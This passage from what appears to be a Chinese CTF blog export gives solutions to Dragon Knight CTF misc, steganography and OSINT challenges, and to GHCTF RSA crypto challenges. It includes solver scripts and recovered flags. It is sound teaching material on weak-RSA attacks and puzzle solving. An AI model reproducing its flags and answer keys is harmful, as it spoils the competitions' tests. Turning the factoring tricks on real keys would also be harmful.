,<span class="number">116</span>) ,(<span class="number">116</span> ,<span class="number">96</span>) ,(<span class="number">116</span> ,<span class="number">67</span>) ,(<span class="number">116</span> ,<span class="number">124</span>) ,(<span class="number">67</span> ,<span class="number">124</span>) ,(<span class="number">67</span> ,<span class="number">88</span>) ,(<span class="number">88</span> ,<span class="number">93</span>) ,(<span class="number">93</span> ,<span class="number">67</span>) ,</span><br><span class="line">         (<span class="number">88</span> ,<span class="number">70</span>) ,(<span class="number">70</span> ,<span class="number">94</span>) ,(<span class="number">88</span> ,<span class="number">94</span>) ,(<span class="number">70</span> ,<span class="number">45</span>) ,(<span class="number">70</span> ,<span class="number">63</span>) ,(<span class="number">63</span> ,<span class="number">45</span>) ,(<span class="number">45</span> ,<span class="number">66</span>) ,(<span class="number">66</span> ,<span class="number">31</span>) ,(<span class="number">45</span> ,<span class="number">31</span>) ,(<span class="number">66</span> ,<span class="number">69</span>) ,(<span class="number">66</span> ,<span class="number">59</span>) ,</span><br><span class="line">         (<span class="number">59</span> ,<span class="number">69</span>) ,(<span class="number">69</span> ,<span class="number">7</span>) ,(<span class="number">69</span> ,<span class="number">84</span>) ,(<span class="number">7</span> ,<span class="number">84</span>) ,(<span class="number">84</span> ,<span class="number">50</span>) ,(<span class="number">50</span> ,<span class="number">6</span>) ,(<span class="number">84</span> ,<span class="number">6</span>) ,(<span class="number">50</span> ,<span class="number">101</span>) ,(<span class="number">50</span> ,<span class="number">2</span>) ,(<span class="number">2</span> ,<span class="number">101</span>) ,(<span class="number">101</span> ,<span class="number">0</span>) ,</span><br><span class="line">         (<span class="number">101</span> ,<span class="number">82</span>) ,(<span class="number">0</span> ,<span class="number">82</span>) ,(<span class="number">82</span> ,<span class="number">125</span>)</span><br><span class="line">        ]</span><br><span class="line">G = nx.Graph()</span><br><span class="line">G.add_edges_from(lujin)</span><br><span class="line">lst = <span class="built_in">list</span>(nx.all_simple_paths(G ,source=<span class="number">102</span> ,target=<span class="number">125</span> ,cutoff=<span class="number">35</span>))</span><br><span class="line">min_len = <span class="built_in">min</span>([<span class="built_in">len</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> lst])</span><br><span class="line">[[<span class="built_in">print</span>(<span class="built_in">chr</span>(x) ,end=<span class="string">&quot;&quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> i] <span class="keyword">for</span> i <span class="keyword">in</span> lst <span class="keyword">if</span> <span class="built_in">len</span>(i) == min_len]</span><br></pre></td></tr></table></figure>

<p>flag{wish_DrAGonKNI9HtCXF-BET2eR}</p>
<p>func_Pixels<br>这个题目其实有一点点脑洞，给各位师傅道个歉，<br>描述中的（0,0）提出来转为ascii就是DRK，<br>但是后面那个hint给的其实很明显，应该都能想到就是green通道的位置是计数器的二次方，那么blue通道就是计数器的三次方，red通道就是计数器的一次方，看一下加密代码更清楚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_encode</span>(<span class="params">img ,flag</span>):</span><br><span class="line">    width, height = img.size</span><br><span class="line">    pixels = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            pixels[(x ,y)] = img.getpixel((x ,y))</span><br><span class="line">    <span class="built_in">print</span>(pixels[(<span class="number">0</span>,<span class="number">0</span>)])</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span> ,<span class="built_in">int</span>(<span class="built_in">len</span>(flag)/<span class="number">3</span>)):</span><br><span class="line">        r_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">1</span>))</span><br><span class="line">        g_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">2</span>))</span><br><span class="line">        b_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        pixels[(pos ,r_pos)] = (<span class="built_in">ord</span>(flag[pos*<span class="number">3</span>]) ,pixels[(pos ,r_pos)][<span class="number">1</span>] ,pixels[(pos ,r_pos)][<span class="number">2</span>])</span><br><span class="line">        pixels[(pos ,g_pos)] = (pixels[(pos ,r_pos)][<span class="number">0</span>] ,<span class="built_in">ord</span>(flag[pos*<span class="number">3</span>+<span class="number">1</span>]) ,pixels[(pos ,r_pos)][<span class="number">2</span>])</span><br><span class="line">        pixels[(pos ,b_pos)] = (pixels[(pos ,r_pos)][<span class="number">0</span>] ,pixels[(pos ,r_pos)][<span class="number">1</span>] ,<span class="built_in">ord</span>(flag[pos*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key ,value <span class="keyword">in</span> pixels.items():</span><br><span class="line">        img.putpixel(key ,value)</span><br><span class="line">    img.save(<span class="string">&quot;./LEIMU_encoded.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>根据加密函数写一下就完事</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_decode</span>(<span class="params">img</span>):</span><br><span class="line">    width ,height = img.size</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span> ,<span class="number">10</span>):</span><br><span class="line">        r_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">1</span>))</span><br><span class="line">        g_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">2</span>))</span><br><span class="line">        b_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        r = img.getpixel((pos ,r_pos))[<span class="number">0</span>]</span><br><span class="line">        g = img.getpixel((pos ,g_pos))[<span class="number">1</span>]</span><br><span class="line">        b = img.getpixel((pos ,b_pos))[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">chr</span>(r)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(g)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(b)&#125;</span>&quot;</span> ,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>有一点脑洞，给各位👴跪了</p>
<h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a><strong>Osint</strong></h2><p>给大家道个歉吧，这题本来是不好做的，某些原因导致可以直接识图找到了<br>Ai 识别发现并不在国内，在美国<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588795-61b58113-b4ce-43c2-a591-7083933985fe.png" alt="image.png"><br>搜索美国标志性摩天轮一个个排查就可以找到了，因为角度比较刁钻看不到海岸线的特征会 有很多的误导项，找到最著名的几个可以佛罗里达州，直接搜佛罗里达州摩天轮就行了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588797-653cb50b-5944-4200-bc12-106667b15486.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733589123-26e938e8-844c-4a97-b678-79072e2ffd0b.png" alt="image.png"><br>朋友卡的非常好，但凡漏出红色缆车都会被秒<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733591050-fbd33c86-b2f2-430f-89fe-5707add8aeca.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>GHCTF</title>
    <url>/2025/03/05/GHCTF/</url>
    <content><![CDATA[<p>ouo</p>
<p>上周天打了GHCTF，题虽然不是特别难(毕竟说的是新生赛)不过也刚好巩固了一下基础</p>
<span id="more"></span>

<h1 id="baby-signin"><a href="#baby-signin" class="headerlink" title="baby_signin"></a>baby_signin</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line">p=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxx&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=<span class="number">4</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 182756071972245688517047475576147877841</span></span><br><span class="line"><span class="string">q= 305364532854935080710443995362714630091</span></span><br><span class="line"><span class="string">c= 14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line"><span class="string">n= 55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看到e&#x3D;4其实就大概有思路了，不是rabin就是e与phi不互素。首先尝试一下二次rabin发现出不来。那么就大致确定是e与phi不互素，最后验证一下发现确实是这样。对于不互素问题我们通常有两种解法。第一种是求gcd(e,phi)&#x3D;t,把m$^t$看作整体去处理，尝试后发现这个方法在本题中不使用。那么我们就直接进行有限域开根。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">4</span></span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line"><span class="built_in">print</span>(gcd(e,((p-<span class="number">1</span>)*(q-<span class="number">1</span>))))</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x^<span class="number">4</span> - c</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(q))</span><br><span class="line">f = x^<span class="number">4</span> - c</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>])],[p,q])</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h1 id="baby-factor"><a href="#baby-factor" class="headerlink" title="baby_factor"></a>baby_factor</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    pl  = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pl.append(getPrime(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(pl)</span><br><span class="line">pl = create()</span><br><span class="line">m=<span class="string">b&#x27;NSSCTF&#123;xxx&#125;&#x27;</span></span><br><span class="line">p,q,r = pl[<span class="number">0</span>],pl[<span class="number">1</span>],pl[<span class="number">2</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(m),e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;phi=<span class="subst">&#123;phi&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197846086151042512153782486075793224874304872205720564733574010669935992016367832666397263951446340260962650378484847385424893514879629196181114844346169851383460163815147712907264437435463059397586675769959094397311450861780912636566993749356097243760640620004707428340786147078475120876426087835327094386842765660642186546472260607586011343238080538092580452700406255443887820337778505999803772196923996033929998741437250238302626841957729397241851219567703420968177784088484002831289722211924810899441563382481216744212304879717297444824808184727136770899310815544776369231934774967139834384853322157766059825736075553</span></span><br><span class="line"><span class="string">phi=2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197784246608456057052779643060628984335578973450260519106769911425793594847759982583376628098472390090331415895352869275325656949958242181688663465437185437198392460569653734315961071709533645370007008616755547195108861900432818710027794402838336405197750190466425895582236209479543326147804766393022786785337752319686125574507066082357748118175068545756301823381723776525427724798780890160482013759497102382173931716030992837059880049832065500252713739288235410544982532170147652055063681116147027591678349638753796122845041417275362394757384204924094885233281257928031484806977974575497621444483701792085077113227851520</span></span><br><span class="line"><span class="string">c=2675023626005191241628571734421094007494866451142251352071850033504791090546156004348738217761733467156596330653396106482342801412567035848069931148880296036606611571818493841795682186933874790388789734748415540102210757974884805905578650801916130709273985096229857987312816790471330181166965876955546627327549473645830218664078284830699777113214559053294592015697007540297033755845037866295098660371843447432672454589238297647906075964139778749351627739005675106752803394387612753005638224496040203274119150075266870378506841838513636541340104864561937527329845541975189814018246183215952285198950920021711141273569490277643382722047159198943471946774301837440950402563578645113393610924438585345876355654972759318203702572517614743063464534582417760958462550905093489838646250677941813170355212088529993225869303917882372480469839803533981671743959732373159808299457374754090436951368378994871937358645247263240789585351233</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>给了phi直接求解就行，没啥好说的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2, gcd</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line">n=<span class="number">2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197846086151042512153782486075793224874304872205720564733574010669935992016367832666397263951446340260962650378484847385424893514879629196181114844346169851383460163815147712907264437435463059397586675769959094397311450861780912636566993749356097243760640620004707428340786147078475120876426087835327094386842765660642186546472260607586011343238080538092580452700406255443887820337778505999803772196923996033929998741437250238302626841957729397241851219567703420968177784088484002831289722211924810899441563382481216744212304879717297444824808184727136770899310815544776369231934774967139834384853322157766059825736075553</span></span><br><span class="line">phi=<span class="number">2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197784246608456057052779643060628984335578973450260519106769911425793594847759982583376628098472390090331415895352869275325656949958242181688663465437185437198392460569653734315961071709533645370007008616755547195108861900432818710027794402838336405197750190466425895582236209479543326147804766393022786785337752319686125574507066082357748118175068545756301823381723776525427724798780890160482013759497102382173931716030992837059880049832065500252713739288235410544982532170147652055063681116147027591678349638753796122845041417275362394757384204924094885233281257928031484806977974575497621444483701792085077113227851520</span></span><br><span class="line">c=<span class="number">2675023626005191241628571734421094007494866451142251352071850033504791090546156004348738217761733467156596330653396106482342801412567035848069931148880296036606611571818493841795682186933874790388789734748415540102210757974884805905578650801916130709273985096229857987312816790471330181166965876955546627327549473645830218664078284830699777113214559053294592015697007540297033755845037866295098660371843447432672454589238297647906075964139778749351627739005675106752803394387612753005638224496040203274119150075266870378506841838513636541340104864561937527329845541975189814018246183215952285198950920021711141273569490277643382722047159198943471946774301837440950402563578645113393610924438585345876355654972759318203702572517614743063464534582417760958462550905093489838646250677941813170355212088529993225869303917882372480469839803533981671743959732373159808299457374754090436951368378994871937358645247263240789585351233</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>

<h1 id="EZ-Fermat"><a href="#EZ-Fermat" class="headerlink" title="EZ_Fermat"></a>EZ_Fermat</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = R(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p),n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line"><span class="string">f = 2*x^332 - x^331 + x^329 + 3*x^328 - x^327 - 3*x^325 + x^323 - 3*x^322 - x^321 - 3*x^320 + x^319 + 2*x^318 - 4*x^317 - 3*x^315 - 2*x^314 + x^313 + x^312 + 2*x^311 + 2*x^309 + 2*x^308 + 5*x^307 + 2*x^306 + 3*x^305 + 5*x^304 + 4*x^303 + x^302 - x^301 - x^300 - 2*x^299 - 2*x^298 + x^297 + 3*x^296 - x^295 - 4*x^292 - x^290 + 4*x^289 - x^287 - 3*x^286 + x^285 - 2*x^284 + x^283 - x^282 - 2*x^281 + x^280 - 2*x^279 + x^278 + 2*x^277 - 3*x^276 - x^275 - 4*x^274 - 3*x^273 - 5*x^272 - 2*x^271 - 3*x^270 + 2*x^269 + 2*x^268 - x^267 - 2*x^266 + x^265 + x^264 - 3*x^262 - 3*x^259 + 2*x^258 - x^257 + 2*x^256 + 2*x^255 - x^254 - 2*x^253 - x^252 + 2*x^251 - x^250 + x^249 + 2*x^247 + 2*x^246 + 2*x^245 - 2*x^244 - 3*x^243 + 2*x^242 - 3*x^241 - x^240 - 3*x^239 - x^236 - 3*x^235 - 2*x^234 - x^233 - 2*x^232 - x^231 - 3*x^230 - 2*x^229 - 4*x^228 - 2*x^227 - 3*x^226 + 2*x^225 + x^224 - x^223 - 2*x^221 + 3*x^219 - x^217 - 2*x^216 + x^215 + 2*x^213 - x^212 + 3*x^211 + x^210 + 4*x^209 + x^208 - x^206 - x^205 - x^204 + 2*x^203 - 3*x^202 + 2*x^199 - x^198 + 2*x^196 - 2*x^195 + 3*x^194 + 3*x^193 - x^192 + 4*x^191 + 2*x^189 + x^186 - x^185 - x^184 + 3*x^183 + x^182 + 2*x^181 - 2*x^180 + x^177 + x^175 - x^173 + 3*x^172 + x^170 + x^169 - x^167 - 2*x^166 - x^165 - 4*x^164 - 2*x^163 + 2*x^162 + 4*x^161 - 2*x^160 - 3*x^159 - 2*x^158 - 2*x^157 + x^156 - x^155 + 3*x^154 - 4*x^153 + x^151 + 2*x^150 + x^149 - x^148 + 2*x^147 + 3*x^146 + 2*x^145 - 4*x^144 - 4*x^143 + x^142 - 2*x^140 - 2*x^139 + 2*x^138 + 3*x^137 + 3*x^136 + 3*x^135 + x^134 - x^133 + 2*x^132 + 3*x^130 - 3*x^129 - 2*x^128 - x^127 - 2*x^126 + x^125 + x^124 - 2*x^123 + x^122 - x^121 + 3*x^120 - x^119 - 2*x^118 - x^117 - x^116 - 2*x^115 + 2*x^114 + 2*x^113 - 3*x^112 - x^111 - 4*x^110 + x^109 + x^108 + x^106 - 4*x^105 + x^104 - x^103 - x^101 + x^100 - 2*x^99 + x^98 - x^97 + 3*x^96 + 3*x^94 - x^93 - x^92 + x^91 - 2*x^90 + x^89 - x^88 + x^87 - x^86 + x^85 + x^84 - x^83 + x^79 - 3*x^78 - 2*x^77 + x^74 + 3*x^73 - x^72 - 3*x^71 - 2*x^70 + x^69 - 3*x^66 + x^65 + x^64 - 4*x^62 - x^61 + x^60 - x^59 + 3*x^58 - x^57 - x^54 + 3*x^53 + x^51 - 3*x^50 - x^49 + 2*x^47 - x^46 - x^44 + x^43 - x^42 - 4*x^41 - 3*x^39 - x^37 - x^36 - 3*x^35 + x^34 + x^33 - 2*x^32 + 2*x^31 - x^30 + 2*x^29 - 2*x^28 - 2*x^27 - x^24 + x^22 - 5*x^21 + 3*x^20 + 2*x^19 - x^18 + 2*x^17 + x^16 - 2*x^15 - 2*x^14 + x^13 + x^12 + 2*x^11 - 3*x^10 + 3*x^9 + 2*x^8 - 4*x^6 - 2*x^5 - 4*x^4 + x^3 - x^2 - 1</span></span><br><span class="line"><span class="string">w = 32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目给出提示，其实就是考察费马小定理。题目给出了2$^{f(p)}$mod n&#x3D;w,根据中国剩余定理，很明显对于模p和模q同样成立。同时根据费马小定理2$^{p-1}$&#x3D;1 mod p，我们可以化简为2$^{f(p)mod(p-1)}$mod p &#x3D;w那么如何求f(p) mod (p-1)呢。</p>
<p>p≡1mod(p−1)，即 p 除以 p−1的余数为 1。因此，对于任意正整数 k，有：p$^k$≡1$^k$≡1mod  (p−1),将 p≡1mod  (p−1) 代入 f(p)，得到的正是f(1)的值。即f(p) mod (p-1)&#x3D;f(1) mod (p-1)再将指数转为f(1),即可得到2$^{f(1)}$mod n&#x3D;w,即2$^{f(1)}$-w&#x3D;0 mod n，将1代入多项式求解后取gcd(2$^{f(1)}$-w,n)即可得到p。随后正常求解rsa即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="number">2</span> * x**<span class="number">332</span> - x**<span class="number">331</span> + x**<span class="number">329</span> + <span class="number">3</span> * x**<span class="number">328</span> - x**<span class="number">327</span> - <span class="number">3</span> * x**<span class="number">325</span> + x**<span class="number">323</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">322</span> - x**<span class="number">321</span> - <span class="number">3</span> * x**<span class="number">320</span> + x**<span class="number">319</span> + <span class="number">2</span> * x**<span class="number">318</span> - <span class="number">4</span> * x**<span class="number">317</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">315</span> - <span class="number">2</span> * x**<span class="number">314</span> + x**<span class="number">313</span> + x**<span class="number">312</span> + <span class="number">2</span> * x**<span class="number">311</span> + <span class="number">2</span> * x**<span class="number">309</span></span><br><span class="line">        + <span class="number">2</span> * x**<span class="number">308</span> + <span class="number">5</span> * x**<span class="number">307</span> + <span class="number">2</span> * x**<span class="number">306</span> + <span class="number">3</span> * x**<span class="number">305</span> + <span class="number">5</span> * x**<span class="number">304</span></span><br><span class="line">        + <span class="number">4</span> * x**<span class="number">303</span> + x**<span class="number">302</span> - x**<span class="number">301</span> - x**<span class="number">300</span> - <span class="number">2</span> * x**<span class="number">299</span> - <span class="number">2</span> * x**<span class="number">298</span> + x**<span class="number">297</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">296</span> - x**<span class="number">295</span> - <span class="number">4</span> * x**<span class="number">292</span> - x**<span class="number">290</span> + <span class="number">4</span> * x**<span class="number">289</span> - x**<span class="number">287</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">286</span> + x**<span class="number">285</span> - <span class="number">2</span> * x**<span class="number">284</span> + x**<span class="number">283</span> - x**<span class="number">282</span> - <span class="number">2</span> * x**<span class="number">281</span></span><br><span class="line">        + x**<span class="number">280</span> - <span class="number">2</span> * x**<span class="number">279</span> + x**<span class="number">278</span> + <span class="number">2</span> * x**<span class="number">277</span> - <span class="number">3</span> * x**<span class="number">276</span> - x**<span class="number">275</span></span><br><span class="line">        - <span class="number">4</span> * x**<span class="number">274</span> - <span class="number">3</span> * x**<span class="number">273</span> - <span class="number">5</span> * x**<span class="number">272</span> - <span class="number">2</span> * x**<span class="number">271</span> - <span class="number">3</span> * x**<span class="number">270</span></span><br><span class="line">        + <span class="number">2</span> * x**<span class="number">269</span> + <span class="number">2</span> * x**<span class="number">268</span> - x**<span class="number">267</span> - <span class="number">2</span> * x**<span class="number">266</span> + x**<span class="number">265</span> + x**<span class="number">264</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">262</span> - <span class="number">3</span> * x**<span class="number">259</span> + <span class="number">2</span> * x**<span class="number">258</span> - x**<span class="number">257</span> + <span class="number">2</span> * x**<span class="number">256</span> + <span class="number">2</span> * x**<span class="number">255</span></span><br><span class="line">        - x**<span class="number">254</span> - <span class="number">2</span> * x**<span class="number">253</span> - x**<span class="number">252</span> + <span class="number">2</span> * x**<span class="number">251</span> - x**<span class="number">250</span> + x**<span class="number">249</span> + <span class="number">2</span> * x**<span class="number">247</span></span><br><span class="line">        + <span class="number">2</span> * x**<span class="number">246</span> + <span class="number">2</span> * x**<span class="number">245</span> - <span class="number">2</span> * x**<span class="number">244</span> - <span class="number">3</span> * x**<span class="number">243</span> + <span class="number">2</span> * x**<span class="number">242</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">241</span> - x**<span class="number">240</span> - <span class="number">3</span> * x**<span class="number">239</span> - x**<span class="number">236</span> - <span class="number">3</span> * x**<span class="number">235</span> - <span class="number">2</span> * x**<span class="number">234</span></span><br><span class="line">        - x**<span class="number">233</span> - <span class="number">2</span> * x**<span class="number">232</span> - x**<span class="number">231</span> - <span class="number">3</span> * x**<span class="number">230</span> - <span class="number">2</span> * x**<span class="number">229</span> - <span class="number">4</span> * x**<span class="number">228</span></span><br><span class="line">        - <span class="number">2</span> * x**<span class="number">227</span> - <span class="number">3</span> * x**<span class="number">226</span> + <span class="number">2</span> * x**<span class="number">225</span> + x**<span class="number">224</span> - x**<span class="number">223</span> - <span class="number">2</span> * x**<span class="number">221</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">219</span> - x**<span class="number">217</span> - <span class="number">2</span> * x**<span class="number">216</span> + x**<span class="number">215</span> + <span class="number">2</span> * x**<span class="number">213</span> - x**<span class="number">212</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">211</span> + x**<span class="number">210</span> + <span class="number">4</span> * x**<span class="number">209</span> + x**<span class="number">208</span> - x**<span class="number">206</span> - x**<span class="number">205</span> - x**<span class="number">204</span></span><br><span class="line">        + <span class="number">2</span> * x**<span class="number">203</span> - <span class="number">3</span> * x**<span class="number">202</span> + <span class="number">2</span> * x**<span class="number">199</span> - x**<span class="number">198</span> + <span class="number">2</span> * x**<span class="number">196</span> - <span 